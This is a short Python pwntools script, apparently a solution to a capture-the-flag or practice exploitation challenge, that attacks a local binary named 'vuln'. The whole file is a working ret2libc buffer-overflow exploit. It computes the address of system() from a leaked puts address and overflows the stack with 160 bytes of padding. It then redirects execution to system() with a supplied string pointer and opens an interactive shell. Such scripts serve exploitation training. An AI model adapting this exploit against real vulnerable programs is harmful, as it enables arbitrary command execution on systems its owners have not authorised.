import pwn
import re

gdb_puts = 0xf7e65140
gdb_system = 0xf7e40940

offset = gdb_puts - gdb_system

elf = pwn.ELF('./vuln')
p = elf.process()

prompt = p.recv()
print prompt

puts = int(re.findall('puts: (.*)', prompt)[0], 16)
useful_string = int(re.findall('useful_string: (.*)', prompt)[0], 16)

print offset
system = puts - offset

payload = 'A'*160
payload += pwn.p32(system)
payload += 'BBBB'
payload += pwn.p32(useful_string)

p.sendline(payload)
p.interactive()

p.close()